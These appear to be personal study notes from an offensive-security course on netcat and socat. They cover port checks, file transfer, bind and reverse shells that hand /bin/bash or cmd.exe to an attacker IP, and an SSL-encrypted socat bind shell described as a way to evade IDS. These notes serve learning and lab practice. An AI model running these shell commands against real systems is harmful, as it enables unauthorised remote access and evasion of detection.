#4.1 Netcat           # client mode - check if port is opened // read banner from service listenning on a port // Connect to a network service manually

nc -nv 10.10.1.12 110       #check if 110 port is opened on remote machine // -n skip DNS name // -v verbous
nc -lvnp 4444               #listen on 4444 // -l create listener // -p listening port number

## Transfer Files
###on Win (receiving machine):
nc -lvnp 4444 > incoming.exe
###on Linux:
nc -nv 10.10.1.11 4444 < /usr/share/win/.../wget.exe    #don't receive download progress, so give it a time

## Remote Administration with Netcat

## Netcat Bind Shell Scenario
on Win:
nc -nlvp 4444 -e cmd.exe

on Attacker:
nc -nv IP-of-Win 444

## Netcat Reverse Shell Scenario
on Attacker:
nc -nvlp 4444

on Linux Victim:
nc -nv ip-of-attacker 4444 -e /bin/bash   #-e make an application available remotely (in our case - /bin/bash)

#4.2 Netcat VS Socat
nc <remote server's ip address> 80
socat - TCP4:<remote server's ip address>:80    

  ex: socat - TCP4:10.10.11.11:110      #Socat Bind Shell
  USER offsec
  PASS offsec
  
  ex2: start listener
  sudo socat TCP4-LISTEN:443 STDOUT
  on attacker:
  socat - TCP4:10.10.11.11(victimIP):443 --> hello from attacker
  the victim receives the message, and can write back --> yooo man
  the attacker receives "yoo man"       #we have bidirectional chat this wat
  
nc -lvp localhost 443
socat TCP4-LISTEN:443 STDOUT

## Socat File Transfer

sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt   #share file on 443 // fork create chilp process when create listener
// on other machine we download the file:
socat TCP4:10.10.11.1(ip of the sharing machine):443 file:received_secret>passwords.txt,create
//check the file on Windows machine by --> type received_secret_passwords.txt --> print the content of the file

## Socat Reverse Shells
we start listener on Win mashine:
socat -d -d TCP4-LISTEN:443 STDOUT            # -d -d increase the verbousity of the output
and on the victim Linux machine:
socat TCP4:10.11.0.22:443 EXEC:/bin/bash      #check by whoami or id commands

## Socat Encrypted Bind Shells
# evading IDS with SSL encryption //openssl

#generate key:
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt    #enter the data, Coutry, Name, e-mail etc.
          ##
          • req: initiate a new certificate signing request
          • -newkey: generate a new private key
          • rsa:2048: use RSA encryption with a 2,048-bit key length.
          • -nodes: store the private key without passphrase protection
          • -keyout: save the key to a file
          • -x509: output a self-signed certificate instead of a certificate request
          • -days: set validity period in days
          • -out: save the certificate to a file
          
#combine bind shell key and bind shell cert files into single .pem file
cat bind_shell.key bind_shell.crt > bind_shell.pem
# create encrypted socat listener (on "target" machine):
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
# on attacker machine:
socat - OPENSSL:10.11.0.4:443,verify=0 --> start type commands that will be executed on the target
          verify=0 disable ssl verification (because our cert is self signed)

#4.3 PowerShell and Powercat



